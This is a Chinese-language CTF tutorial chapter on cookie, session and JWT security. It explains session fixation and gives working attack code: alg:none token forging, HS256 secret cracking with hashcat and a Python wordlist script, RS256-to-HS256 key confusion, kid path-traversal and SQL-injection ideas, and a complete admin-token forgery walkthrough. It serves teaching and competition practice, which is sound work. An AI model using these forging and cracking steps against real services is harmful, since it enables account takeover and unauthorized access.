---
comments: true

---

# 会话与认证安全

HTTP 协议本身是无状态的：服务器不会记得上一个请求是谁发的。为了识别用户身份，Web 应用需要一套「会话」机制。本章先讲透 Cookie 与 Session 的工作原理和常见攻击面，再重点拆解 CTF 中出现频率极高的 JWT（JSON Web Token）相关漏洞。

## Cookie 与 Session 机制

### Cookie：存储在浏览器的「小纸条」

Cookie 是服务器通过响应头 `Set-Cookie` 发给浏览器的一小段键值对，浏览器之后会 **在每次请求同一域名时自动带上** 它：

```http
HTTP/1.1 200 OK
Set-Cookie: session_id=abc123def456; Path=/; HttpOnly; Secure
```

之后浏览器的每个请求都会携带：

```http
GET /admin HTTP/1.1
Host: example.com
Cookie: session_id=abc123def456
```

要点记住三点：

- **存储位置**：Cookie 存在 **客户端（浏览器）** 里。这意味着用户（和攻击者）可以直接查看、修改它的内容——所以 Cookie 里绝不能直接放 `is_admin=1` 这种可伪造的敏感字段，除非做了签名加密。
- 常用属性：`HttpOnly` 禁止 JavaScript 读取（防 XSS 窃取，参见 XSS攻击 章节）；`Secure` 只在 HTTPS 下发送；`SameSite` 限制跨站携带（防 CSRF）。
- Cookie 通常只存一个 **会话标识符**（session id），真正的用户信息放在服务器端——这就是 Session。

### Session：服务器端的「档案柜」

Session 的工作流程：

1. 用户登录成功，服务器在内存 / 数据库 / Redis 中创建一份会话数据（用户 id、权限等），并生成一个随机的 session id。
2. 服务器通过 `Set-Cookie` 把 session id 发给浏览器。
3. 之后浏览器每次请求都带上这个 id，服务器拿着 id 去「档案柜」里查出对应的用户身份。

用一句话概括两者的关系：**Cookie 是运输工具，Session 是服务器端的数据，session id 是连接两者的钥匙**。

由此可推出 CTF 常考的两个结论：

- session id 必须 **足够随机、不可预测**。如果 id 是 `user_1001`、`user_1002` 这样可枚举的，改个数字就能变成别人的会话（越权，与 逻辑漏洞 章节的越权思路一脉相承）。
- 偷到别人的 session id 就等于偷到别人的登录态，这就是 XSS 窃取 Cookie 的危害所在。

### 会话固定攻击（Session Fixation）简介

正常流程是「先登录，后发放 session id」。会话固定攻击反其道而行：

1. 攻击者先访问网站，拿到一个 **未登录状态的** session id，比如 `sid=attacker_known`。
2. 通过某种方式（发钓鱼链接 `http://example.com/?sid=attacker_known`，或利用 XSS）让 **受害者带着这个 id 去登录**。
3. 如果服务器在用户登录后 **不更换 session id**，那么攻击者手里的那个 id 现在就对应着受害者的已登录会话——攻击者直接用它访问，就是受害者的身份。

防御很简单：登录成功后重新生成 session id。CTF 中更多是以「登录前后 session id 不变」作为解题线索出现，知道这个概念即可。

## JWT 结构与解码

### 为什么需要 JWT

传统 Session 要求服务器保存所有会话数据，分布式系统里共享 Session 很麻烦。JWT 的思路是：**把用户信息直接塞进 Token 里发给客户端，服务器不存任何东西，只靠签名防伪**。服务器收到 Token 后只要验证签名有效，就相信里面的内容。

### 三段式结构

一个 JWT 由三部分组成，用 `.` 分隔：`Header.Payload.Signature`

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoieW91Iiwicm9sZSI6Imd1ZXN0In0.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk
```

- **Header**：JSON，声明签名算法（`alg`）和类型（`typ`），如 `{"alg":"HS256","typ":"JWT"}`。
- **Payload**：JSON，存放实际数据（`claims`），如用户名、角色、过期时间（`exp`）。
- **Signature**：用密钥对前两段（`base64url(Header) + "." + base64url(Payload)`）计算出的签名，防止篡改。

前两段只是 **base64url 编码，不是加密**——任何人都能解码查看，所以 Payload 里绝不能放密码等机密。

### 动手解码查看

解码不需要任何密钥，用 Python 即可（注意 base64url 与标准 base64 的差别是 `-_` 替换 `+/`，且要去掉末尾补位的 `=`）：

```python
import base64, json

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoieW91Iiwicm9sZSI6Imd1ZXN0In0.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"

for part in token.split(".")[:2]:          # 只解前两段
    part += "=" * (-len(part) % 4)         # 补回 padding
    print(json.loads(base64.urlsafe_b64decode(part)))
```

输出：

```text
{'alg': 'HS256', 'typ': 'JWT'}
{'user': 'you', 'role': 'guest'}
```

也可以在 [jwt.io](https://jwt.io) 上粘贴查看。但记住：**能看懂内容 ≠ 能伪造内容**，改了 Payload 后签名就对不上了——除非签名环节出了漏洞，下面三种就是 CTF 的常客。

## alg:none 攻击

JWT 标准允许 `alg` 为 `none`，表示「这个 Token 不需要签名」。如果服务端校验时 **直接信任客户端声明的算法**，攻击者就可以构造一个无签名的 Token：

1. 把 Header 改成 `{"alg":"none","typ":"JWT"}`。
2. Payload 随意伪造，比如把 `role` 改成 `admin`。
3. 签名部分留空，但 **末尾的点必须保留**。

构造过程（纯 Python，无需第三方库）：

```python
import base64, json

def b64url(data: dict) -> str:
    raw = json.dumps(data, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

header  = b64url({"alg": "none", "typ": "JWT"})
payload = b64url({"user": "you", "role": "admin"})

print(f"{header}.{payload}.")   # 注意结尾的点
```

把生成的 Token 替换请求中原有的 JWT 即可。注意有些实现要求写 `None`、`NONE`、`nOnE` 等变体来绕过大小写过滤，实战中都可以试一遍。也可以用 [jwt_tool](https://github.com/ticarpi/jwt_tool) 一键完成：

```bash
python3 jwt_tool.py <TOKEN> -X a   # 自动尝试 alg:none 攻击
```

## 弱密钥爆破

HS256 是对称签名算法：**签名和验签用同一个密钥**。如果服务器用了 `secret`、`123456` 这类弱密钥，攻击者拿到任意一个合法 JWT 后，就能在本地离线爆破出密钥——爆破成功就意味着可以任意伪造 Token。

### 用 hashcat 爆破

把 JWT 原样存进文件（hashcat 模式 `16500` 专门支持 JWT）：

```bash
echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoieW91Iiwicm9sZSI6Imd1ZXN0In0.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk' > jwt.txt

hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

`-a 0` 表示字典攻击，`rockyou.txt` 是经典弱口令字典（Kali 自带）。跑出密钥后（这个例子的密钥是 `secret`），就可以用它给自己签发一个 `role=admin` 的 Token。

### 用 jwt_tool 爆破

```bash
python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```

### 用 Python 手写爆破（理解原理）

```python
import hmac, hashlib, base64

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoieW91Iiwicm9sZSI6Imd1ZXN0In0.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
header_payload, _, signature = token.rpartition(".")

target = base64.urlsafe_b64decode(signature + "=" * (-len(signature) % 4))

with open("/usr/share/wordlists/rockyou.txt", "rb") as f:
    for line in f:
        key = line.strip()
        sig = hmac.new(key, header_payload.encode(), hashlib.sha256).digest()
        if hmac.compare_digest(sig, target):
            print("密钥找到了:", key)
            break
```

原理就是拿字典里的每个候选密钥对 `Header.Payload` 算一遍 HMAC-SHA256，和 Token 自带的签名比对。防御手段是使用足够长的高强度随机密钥。

## RS256 → HS256 算法混淆攻击

RS256 与 HS256 的本质区别：

- **RS256（非对称）**：服务器用 **私钥** 签名，用 **公钥** 验签。公钥可以公开。
- **HS256（对称）**：同一个密钥既签名又验签。

混淆攻击的条件：服务端代码写死了「用公钥验签」，但 **允许客户端通过 Header 里的 `alg` 指定算法**。攻击步骤：

1. 通过泄露的源码、证书、`/.well-known/jwks.json` 等途径拿到服务器的 **公钥**（公钥本来就是公开的，参见 敏感信息泄露 章节的信息收集思路）。
2. 构造一个 Header 为 `{"alg":"HS256","typ":"JWT"}` 的 Token，Payload 随意伪造。
3. **把公钥当作 HMAC 密钥**，用 HS256 给这个 Token 签名。
4. 服务端看到 `alg=HS256`，于是拿手里的公钥当 HMAC 密钥验签——签名正好匹配，伪造成功。

核心就是一句话：对服务器来说是「公钥」，对 HS256 来说只是「一串字节」，而这串字节攻击者也有。防御：服务端必须 **强制指定算法**，不允许 Token 自带 `alg` 决定验签方式。

用 `PyJWT` 复现（注意要用公钥的原始文本作为 key）：

```python
import jwt

with open("public.pem") as f:
    public_key = f.read()

forged = jwt.encode(
    {"user": "you", "role": "admin"},
    public_key,
    algorithm="HS256",   # 用公钥做 HMAC 签名
)
print(forged)
```

## kid 注入等进阶点简介

当服务器有多把密钥时，JWT 的 Header 里会带一个 `kid`（key id）字段告诉服务器用哪把验签：`{"alg":"HS256","typ":"JWT","kid":"key1"}`。问题出在服务器如果**直接用 `kid` 去拼接文件路径或 SQL 查询**：

- **路径穿越读任意文件**：`kid` 设为 `../../../../../../etc/passwd`，服务器可能去读对应文件当密钥。更妙的用法是指向 **内容已知的文件**，比如 `/dev/null`（内容为空）或公开的静态文件，然后用这个已知内容作为 HMAC 密钥来伪造签名。
- **SQL 注入**：如果 `kid` 被拼进 `SELECT key FROM keys WHERE id = '<kid>'`，就可以用 union 注入控制返回的「密钥」，例如让查询返回攻击者指定的字符串，再用它签名。这与 SQL注入 章节的手法完全相同，只是入口从表单搬到了 JWT Header。

除此之外还有两个值得知道的名字：

- **`jku` / `x5u` 伪造**：Header 里可以声明「我的公钥放在这个 URL 上」，若服务器不校验域名白名单就会去攻击者的服务器取公钥，攻击者自然用对应的私钥签名。
- **弱随机 / 时间戳可预测的 secret**：本质是弱密钥的变种，思路同上文爆破。

这些进阶点在普通 CTF 题里出现频率较低，了解原理、遇到时知道往哪个方向试即可，即「够用即止」。

## CTF 例题：JWT 伪造拿 flag

题目描述（典型套路）：某站点登录后下发 JWT，访问 `/flag` 时提示 `only admin can get flag`。注册接口开放，但没有 admin 账号。

### 第一步：注册并抓取 Token

用 `curl` 注册一个普通用户并登录，从响应头里拿到 JWT：

```bash
curl -s -c cookie.txt -X POST http://target/login \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=test&password=test123"
grep session cookie.txt
```

得到 Token：

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidXNlciJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJVadQssw5c
```

### 第二步：解码分析

用前面的解码脚本看一下 Payload：

```text
{'alg': 'HS256', 'typ': 'JWT'}
{'username': 'test', 'role': 'user'}
```

`role` 是 `user`，目标就是把它改成 `admin`。先试 alg:none——把 Token 改成无签名版本提交，服务器返回 `invalid signature`，说明服务端校验了签名，此路不通。接着试弱密钥爆破。

### 第三步：爆破密钥

```bash
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

几秒后命中：`secret123`。有了密钥，伪造权柄到手。

### 第四步：伪造 admin Token（完整脚本）

```python
import base64, hashlib, hmac, json

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

secret = b"secret123"   # 上一步爆破出的密钥

header  = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
payload = b64url(json.dumps({"username": "test", "role": "admin"}, separators=(",", ":")).encode())

signing_input = f"{header}.{payload}".encode()
signature = b64url(hmac.new(secret, signing_input, hashlib.sha256).digest())

token = f"{header}.{payload}.{signature}"
print(token)
```

也可以用 `PyJWT` 一行搞定：`jwt.encode({"username":"test","role":"admin"}, "secret123", algorithm="HS256")`，效果相同。

### 第五步：带上伪造的 Token 访问 /flag

```bash
curl -s http://target/flag -H "Authorization: Bearer <伪造的TOKEN>"
```

服务器验签通过，读到 `role=admin`，返回 `flag{jwt_w34k_s3cr3t_k3y}`。

### 解题思路总结

拿到 JWT 类题目，按这个顺序排查效率最高：

1. 解码看 Payload 里有什么字段、`alg` 是什么；
2. 试 **alg:none**（以及各种大小写变体）；
3. HS256 就 **爆破弱密钥**（hashcat 模式 16500 + rockyou）；
4. RS256 且能拿到公钥，就试 **算法混淆**；
5. Header 里有 `kid` / `jku` 等字段，就往 **注入和任意文件读取** 方向想。

把这套流程练熟，绝大多数 CTF 的 JWT 题都能拿下。
